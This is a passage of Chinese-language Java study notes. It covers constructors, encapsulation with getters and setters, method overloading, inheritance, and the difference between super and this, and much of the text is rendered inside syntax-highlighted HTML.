 <code>String name;</code>）</li><li>接着再次回到new</li><li>然后接着往下走</li></ol><p>作用：</p><ul><li>使用new关键字，不质是在调用构造器</li><li>用来初始化值</li></ul><p>构造器:<br>1.和类名相同<br>2.没有返回值<br>作用:<br>1.new 本质在调用构造方法<br>2.初始化对象的值<br>注意点:<br>1.定义有参构造之后，如果想使用无参构造，显示的定义一个无参的构造<br>2.alt+insert<br>3.this.     &#x3D;      </p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">1</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">类</span></span><span class="line"><span style="color: #E06C75">2</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">方法</span></span><span class="line"><span style="color: #E06C75">3</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">引用类型</span><span style="color: #C678DD">:</span><span style="color: #E06C75">基本类型(</span><span style="color: #D19A66">8</span><span style="color: #E06C75">)对象是通过引用来操作的</span><span style="color: #C678DD">:</span><span style="color: #E06C75">栈</span><span style="color: #ABB2BF">--</span><span style="color: #C678DD">-&gt;</span><span style="color: #E06C75">堆</span></span><span class="line"><span style="color: #E06C75">4</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">属性</span><span style="color: #C678DD">:</span><span style="color: #E06C75">字段Field 成员变量</span></span><span class="line"><span style="color: #E06C75">默认初始化</span><span style="color: #C678DD">:</span></span><span class="line"><span style="color: #E06C75">数字</span><span style="color: #C678DD">:</span><span style="color: #D19A66">8</span></span><span class="line"><span style="color: #D19A66">0.8</span></span><span class="line"><span style="color: #E06C75">u0000char </span><span style="color: #C678DD">:</span></span><span class="line"><span style="color: #C678DD">boolean:</span><span style="color: #D19A66">false</span></span><span class="line"><span style="color: #E06C75">引用</span><span style="color: #C678DD">:</span><span style="color: #D19A66">null</span></span><span class="line"><span style="color: #E06C75">修饰符 属性类型 属性名</span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> 属性值</span><span style="color: #56B6C2">!</span></span><span class="line"><span style="color: #E06C75">5</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">对象的创建和使用</span></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75">必须使用new 关键字创造对象，构造器 </span><span style="color: #E5C07B">Person</span><span style="color: #E06C75"> kuangshen </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">Person</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span><span style="color: #56B6C2">-</span><span style="color: #E06C75">对象的属性kuangshen</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">name对象的方法kuangshen</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">sleep</span><span style="color: #ABB2BF">()</span></span><span class="line"><span style="color: #E06C75">类</span><span style="color: #C678DD">:</span><span style="color: #E06C75">静态的属性动态的行为</span></span><span class="line"><span style="color: #E06C75">```</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">理解：</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">构造器随着对象创建而直接调用，而使用方法还得手动调用</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">（就像，人出生就伴随的  身份证号码，是否在呼吸；但是跑步，游泳是可选择的）</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">## 封装</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75"> 该露的露，该藏的藏</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75"> 我们程序设计要追求“高内聚，低耦合”。高内聚就是类的内部数据操作细节自己完成，不允许外部干涉</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">低耦合</span><span style="color: #C678DD">:</span><span style="color: #E06C75">仅暴露少量的方法给外部使用。</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75"> 封装(数据的隐藏)：</span></span><span class="line"><span style="color: #E06C75">  通常，应禁止直接访问一个对象中数据的实际表示，而应通过操作接口来访问，这称为信息隐藏</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">**</span><span style="color: #E06C75">属性私有，get</span><span style="color: #56B6C2">/</span><span style="color: #E06C75">set</span><span style="color: #56B6C2">**</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">!</span><span style="color: #E06C75">[image</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">20251024164516243</span><span style="color: #E06C75">](C</span><span style="color: #C678DD">:</span><span style="color: #E06C75">\Users\</span><span style="color: #D19A66">95227</span><span style="color: #E06C75">\Desktop\image</span><span style="color: #56B6C2">-</span><span style="color: #E06C75">20251024164516243</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">png</span><span style="color: #E06C75">)</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">`</span><span style="color: #C678DD">private</span><span style="color: #E06C75">`私有属性之后，在main里面调用就会报错</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">`</span><span style="color: #C678DD">public</span><span style="color: #E06C75">`就不会</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">### 如何调用：</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">get</span><span style="color: #56B6C2">/</span><span style="color: #E06C75">set（快捷键alt</span><span style="color: #56B6C2">+</span><span style="color: #E06C75">insert）</span></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"><span style="color: #56B6C2">!</span><span style="color: #E06C75">[](https</span><span style="color: #C678DD">:</span><span style="color: #7F848E; font-style: italic">//cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125555451.png)</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">```java</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Application</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Student</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">s1</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Student</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">s1</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setName</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;秦疆&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">s1</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getName</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">s1</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAge</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span><span style="color: #7F848E; font-style: italic">//不合法的</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">s1</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getAge</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #E06C75">```</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">get用于Application的调用后的</span><span style="color: #56B6C2">**</span><span style="color: #E06C75">输出</span><span style="color: #56B6C2">**</span><span style="color: #E06C75">，set用于调用</span><span style="color: #56B6C2">**</span><span style="color: #E06C75">赋值</span><span style="color: #56B6C2">**</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">意义：</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75"> 提高程序的安全性，保护数据</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  也可以直接在封装内部附加条件，对不合法信息进行过滤</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75"> 隐藏代码的实现细节</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  封装之后看不到，数据隐藏</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75"> 统一接口</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  只使用get和set接口</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75"> 系统可维护增加了</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">**</span><span style="color: #E06C75">理解为什么要封装：</span><span style="color: #56B6C2">**</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">使用有if的`</span><span style="color: #C678DD">public</span><span style="color: #E06C75">`方法</span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75">使用内部if的`</span><span style="color: #C678DD">private</span><span style="color: #E06C75">`</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75">：有条件，可以不走条件，公开属性可以修改（绕过过滤）</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">private</span><span style="color: #E06C75">：有条件，必须走条件，不合法只能被拦截</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">比如：</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75"> public你家大门上挂了个 “请按门铃” 的牌子，大门没锁</span></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #56B6C2">-</span><span style="color: #E06C75"> 有素质的人会按门铃</span></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #56B6C2">-</span><span style="color: #E06C75"> 但没素质的人可以直接推门而入，牌子形同虚设</span></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75"> private想进门必须按门铃（必须调用方法），想绕都绕不过去 </span></span><span class="line"></span><span class="line"><span style="color: #E06C75">## 重载</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">比如println可以输出许多东西</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">步入方法就会知道，写了   许多`相同方法名`的`不同参数`的`方法`</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">!</span><span style="color: #E06C75">[image</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">20251024172431860</span><span style="color: #E06C75">](https</span><span style="color: #C678DD">:</span><span style="color: #7F848E; font-style: italic">//cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125559530.png)</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">## 继承</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75"> 继承的本质是对某一批类的抽象，从而实现对现实世界更好的建模。</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75"> extends的意思是“扩展”。子类是父类的扩展</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">**</span><span style="color: #E06C75">JAVA中类只有单继承，没有多继承</span><span style="color: #56B6C2">!**</span><span style="color: #E06C75">（但是可以通过接口实现）（想了解的直接跳的</span><span style="color: #56B6C2">**</span><span style="color: #E06C75">接口</span><span style="color: #56B6C2">**</span><span style="color: #E06C75">标题查看）</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  一个儿子一个爹；一个爹好几个儿子</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  </span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  ◆ 继承是类和类之间的一种关系。除此之外</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75">类和类之间的关系还有依赖、组合、聚合等</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  ◆ 继承关系的俩个类，一个为子类(派生类)</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75">一个为父类(基类)。子类继承父类</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75">使用关键字extends来表示</span><span style="color: #ABB2BF">,</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  ◆ 子类和父类之间</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75">从意义上讲应该具有</span><span style="color: #98C379">&quot;is a&quot;</span><span style="color: #E06C75">的关系</span><span style="color: #ABB2BF">.</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  ◆ 子类可以继承父类的所有</span><span style="color: #56B6C2">**</span><span style="color: #E06C75">方法</span><span style="color: #56B6C2">**</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  ◆ 子类</span><span style="color: #56B6C2">**</span><span style="color: #E06C75">无法</span><span style="color: #56B6C2">**</span><span style="color: #E06C75">继承父类private</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  但是可以通过get</span><span style="color: #56B6C2">/</span><span style="color: #E06C75">set通过一些特定条件来调用（不能继承，但是留了点接口；不能让你随便花钱，但是可以给你留点）</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">```java</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75">  </span><span style="color: #E5C07B">Person</span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #E06C75">```</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">```java</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Student</span><span style="color: #E06C75"> </span><span style="color: #C678DD">extends</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Person</span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #E06C75">```</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">学生 是 人（student继承 person）</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">**</span><span style="color: #E06C75">感觉像是树形图</span><span style="color: #56B6C2">**</span><span style="color: #E06C75">（ctrl</span><span style="color: #56B6C2">+</span><span style="color: #E06C75">H可以打开继承树）</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75"> 也可以组合：</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  ```java</span></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Student</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">      </span><span style="color: #E5C07B">Person</span><span style="color: #E06C75"> person</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #E06C75">  ```</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75"> 父类上面，还有object：</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #56B6C2">!</span><span style="color: #E06C75">[](C</span><span style="color: #C678DD">:</span><span style="color: #E06C75">\Users\</span><span style="color: #D19A66">95227</span><span style="color: #E06C75">\AppData\Roaming\Typora\typora</span><span style="color: #56B6C2">-</span><span style="color: #E06C75">user</span><span style="color: #56B6C2">-</span><span style="color: #E06C75">images\image</span><span style="color: #56B6C2">-</span><span style="color: #E06C75">20251024173831717</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">png</span><span style="color: #E06C75">)</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  因为object是所有类的父类，所有的类，都默认直接或者间接继承object</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">## </span><span style="color: #E5C07B">Super</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Super对比this</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #56B6C2">!</span><span style="color: #E06C75">[image</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">20251024174447756</span><span style="color: #E06C75">](https</span><span style="color: #C678DD">:</span><span style="color: #7F848E; font-style: italic">//cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125603049.png)</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  ```java</span></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(name);</span><span style="color: #E06C75"> </span><span style="color: #7F848E; font-style: italic">// 输出方法的传参参数</span></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">name</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75"> </span><span style="color: #7F848E; font-style: italic">// 输出当前类的成员变量</span></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">super</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">name</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75"> </span><span style="color: #7F848E; font-style: italic">// 输出父类的成员变量</span></span><span class="line"><span style="color: #E06C75">  ```</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75"> 类内部有默认的构造器</span></span><span class="line"><span style="color: #E06C75">  在的父类写构造器，写输出</span></span><span class="line"><span style="color: #E06C75">  在子类写构造器，写输出</span></span><span class="line"><span style="color: #E06C75">  在所在类内部new一个子类，执行发现：先输出父类，在输出子类</span></span><span class="line"><span style="color: #E06C75">  也就是说，存在隐藏代码，就是调用父类的构造器</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  如果父类是有参的，子类是无参的</span></span><span class="line"><span style="color: #E06C75">  new一个对象发现，调用不了（父类不能用，子类也不能用）</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75"> 总结</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #56B6C2">-</span><span style="color: #E06C75"> super注意点</span><span style="color: #C678DD">:</span></span><span class="line"><span style="color: #E06C75">    1</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">super调用父类的构造方法</span><span style="color: #E06C75">，必须在构造方法的第一个</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    2</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">super</span><span style="color: #E06C75"> 必须只能出现在子类的方法或者构造方法中</span><span style="color: #56B6C2">!</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    3</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">super和</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">this</span><span style="color: #E06C75"> 不能同时调用构造方法</span><span style="color: #56B6C2">!</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    ​因为这两个都要放在第一行，一起用就冲突了</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #56B6C2">-</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Vs</span><span style="color: #E06C75"> this</span><span style="color: #C678DD">:</span></span><span class="line"><span style="color: #E06C75">    代表的对象不同</span><span style="color: #C678DD">:</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">this</span><span style="color: #C678DD">:</span><span style="color: #E06C75">本身调用者这个对象</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">super</span><span style="color: #C678DD">:</span><span style="color: #E06C75">代表父类对象的应用</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    前提：</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">this</span><span style="color: #E06C75">：没有继承也可以使用</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">super</span><span style="color: #E06C75">：只能在继承条件才可以使用</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    构造方法：</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">this</span><span style="color: #E06C75">()：本类的构造</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">super</span><span style="color: #E06C75">()：父类的构造</span><span style="color: #56B6C2">!</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">## 重写</span></span><span class="line"></span><span class="line"><span style="color: 